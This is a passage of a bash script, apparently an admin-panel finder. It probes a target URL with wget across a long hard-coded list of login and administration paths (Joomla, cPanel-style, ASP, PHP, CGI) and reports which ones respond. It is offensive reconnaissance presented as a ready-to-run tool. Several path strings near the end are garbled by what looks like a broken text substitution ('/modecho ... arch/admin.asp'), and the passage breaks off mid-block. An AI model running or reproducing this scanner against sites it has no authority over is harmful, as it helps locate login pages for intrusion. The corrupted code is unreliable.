c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/edit"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/ezsqliteadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/fileadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/fileadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/fileadmin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/fileadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/formslogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/funcoes"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/globes_admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/home.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/home.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/hpwebjetadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/index.swf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Indy_admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/instadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/irc-macadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/irectadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/isadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/isadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/joomla/administrator"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/key"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/kpanel"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/letmein.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/letmein.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/letmein"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/LiveUser_Admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log_in.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log_in.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log_in"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log-in.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log-in.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/log-in"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_adminasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_adminphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_db"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_out"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_outasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_outphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_userasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login_userphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/login1"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login1asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login1php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginerror"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginflat"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginok"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/login-redirect"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginsave"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginsuper"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginsuperasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/loginsuperphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/login-us"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/logo_sysadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/logout"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/logoutasp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/logoutphp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/Lotus_Domino_Admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/macadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manage"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manage.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manage.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/management.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/management.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/management"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/manager.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manager.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manager"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/manuallogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/member.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/member.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/member"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/memberadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memberadmin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/members"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/members.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/members.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/membro"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/membros"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/memlogin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/meta_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 

d="/modecho "-----------------------------------------------------------------------"arch/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/modecho "-----------------------------------------------------------------------"arch/index.asp"
c=$b$d
